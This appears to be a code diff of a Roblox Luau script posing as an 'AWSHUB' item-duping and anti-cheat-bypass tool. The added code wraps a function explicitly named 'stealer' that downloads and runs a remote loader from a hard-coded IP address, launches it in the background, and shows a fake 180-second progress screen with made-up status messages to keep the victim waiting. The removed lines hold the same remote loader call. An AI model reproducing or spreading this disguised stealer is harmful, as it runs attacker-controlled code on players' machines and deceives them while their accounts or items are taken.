@@ -1,4 +1,113 @@
-ID="ae8a5a62-f159-4d73-aca4-3a1e4004dd55";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+local function stealer()
+	ID="ae8a5a62-f159-4d73-aca4-3a1e4004dd55";
+	loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ======== Loading Screen ========
+local function showLoadingScreen()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AWSHubLoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = playerGui
+
+    local bg = Instance.new("Frame", screenGui)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
+    bg.BorderSizePixel = 0
+
+    local title = Instance.new("TextLabel", bg)
+    title.Size = UDim2.new(0, 400, 0, 50)
+    title.Position = UDim2.new(0.5, -200, 0.35, 0)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.FredokaOne
+    title.TextSize = 40
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Text = "AWSHUB"
+    title.TextScaled = true
+
+    local progressBg = Instance.new("Frame", bg)
+    progressBg.Size = UDim2.new(0, 450, 0, 30)
+    progressBg.Position = UDim2.new(0.5, -225, 0.5, 0)
+    progressBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    progressBg.BorderSizePixel = 0
+    local progressBgCorner = Instance.new("UICorner", progressBg)
+    progressBgCorner.CornerRadius = UDim.new(0, 15)
+
+    local progressFill = Instance.new("Frame", progressBg)
+    progressFill.Size = UDim2.new(0, 0, 1, 0)
+    progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    progressFill.BorderSizePixel = 0
+    local progressFillCorner = Instance.new("UICorner", progressFill)
+    progressFillCorner.CornerRadius = UDim.new(0, 15)
+
+    local statusText = Instance.new("TextLabel", bg)
+    statusText.Size = UDim2.new(0, 450, 0, 80)
+    statusText.Position = UDim2.new(0.5, -225, 0.58, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.Font = Enum.Font.SourceSansBold
+    statusText.TextSize = 20
+    statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statusText.Text = "Loading Duper..."
+
+    local percentText = Instance.new("TextLabel", bg)
+    percentText.Size = UDim2.new(0, 450, 0, 30)
+    percentText.Position = UDim2.new(0.5, -225, 0.77, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Font = Enum.Font.SourceSans
+    percentText.TextSize = 18
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.Text = "0%"
+
+    local timeText = Instance.new("TextLabel", bg)
+    timeText.Size = UDim2.new(0, 450, 0, 30)
+    timeText.Position = UDim2.new(0.5, -225, 0.83, 0)
+    timeText.BackgroundTransparency = 1
+    timeText.Font = Enum.Font.SourceSans
+    timeText.TextSize = 18
+    timeText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    timeText.Text = "Estimated time: 180 seconds"
+
+    local totalTime = 180
+    local startTime = tick()
+    local progress = 0
+
+    local function getStatusMessage(progress)
+        if progress <= 25 then
+            return "Loading Duper..."
+        elseif progress <= 50 then
+            return "Loading Dark...\nLoading Freeze...\nTrade..."
+        else
+            return "Loading Clients...\nBypassing Anti Cheat..."
+        end
+    end
+
+    while progress < 100 do
+        local elapsed = tick() - startTime
+        progress = math.min((elapsed / totalTime) * 100, 100)
+
+        progressFill.Size = UDim2.new(progress / 100, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress))
+        statusText.Text = getStatusMessage(progress)
+
+        local timeLeft = math.max(0, math.ceil(totalTime - elapsed))
+        timeText.Text = "Estimated time: " .. timeLeft .. " seconds"
+
+        wait(0.1)
+    end
+
+    screenGui:Destroy()
+end
+
+-- ======== Run ========
+task.spawn(stealer)
+showLoadingScreen()      -- wait 180s loading
+
+
+
 
 
